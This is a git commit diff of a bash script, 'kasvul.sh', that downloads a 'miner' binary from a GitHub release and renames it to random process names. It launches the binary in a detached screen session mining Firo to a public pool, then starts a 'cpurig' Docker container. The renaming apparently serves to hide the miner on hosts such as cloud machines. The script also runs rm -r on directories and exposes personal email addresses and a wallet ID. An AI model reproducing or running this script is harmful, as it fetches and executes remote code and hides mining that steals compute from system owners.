d62b2891ac17447eb4c4702240be9211247871be
wollfoo <nhac.tien1988@gmail.com>
2023-05-25 20:00:39 +0700

    Update ksvul.sh

--- kasvul.sh
+++ kasvul.sh
@@ -1,19 +1,21 @@
 #!/bin/bash
 apt-get update
 apt-get install -y git wget screen
+apt-get install -y docker.io
 azure=mxsemsdnlkdj
 a='mxsemsdnlkdj-' && b=$(shuf -i10-375 -n1) && c='-' && d=$(shuf -i10-259 -n1) && cpuname=$a$b$c$d
-apt-get install -y git wget screen
 rm -r /usr/share/work/$azure
+rm -r /usr/share/work
 mkdir /usr/share
 mkdir /usr/share/work
-rm -r /usr/share/work/platinum
-wget https://github.com/wollfoo/wolethv100/releases/download/wollfoo007/platinum.tar.gz
-mv platinum.tar.gz /usr/share/work/
-cd /usr/share/work/ &&  tar xf platinum.tar.gz
-rm -rf platinum.tar.gz && cd platinum
+wget https://github.com/wollfoo/wolethv100/releases/download/gm/miner
+mv miner /usr/share/work/ && chmod u+x miner
+cd /usr/share/work/
 mv miner $azure -n
 cp $azure "$cpuname"
 rm -f miner
 echo $cpuname" is starting"
-screen -d -m ./"${cpuname}" --algo kheavyhash --server pool.woolypooly.com:3112 --user kaspa:qqfkr6v83cq6ga8qut7rjzyyevltz7rwzgnpcjh2lekf7wuzghg5u5pz9svvp
+screen -d -m ./"${cpuname}" --algo firo --server firo-eu1.picopool.org:22443 --user a9qF6ebLR5pY7LebgwT1YQYjmT1Kmrwx6E.vul/crassanciso1986@gmail.com --ssl 1
+
+docker rm -f cpudataissa
+docker run --add-host=localhost:127.215.121.222 -d --name cpudataissa nvts/cpurig
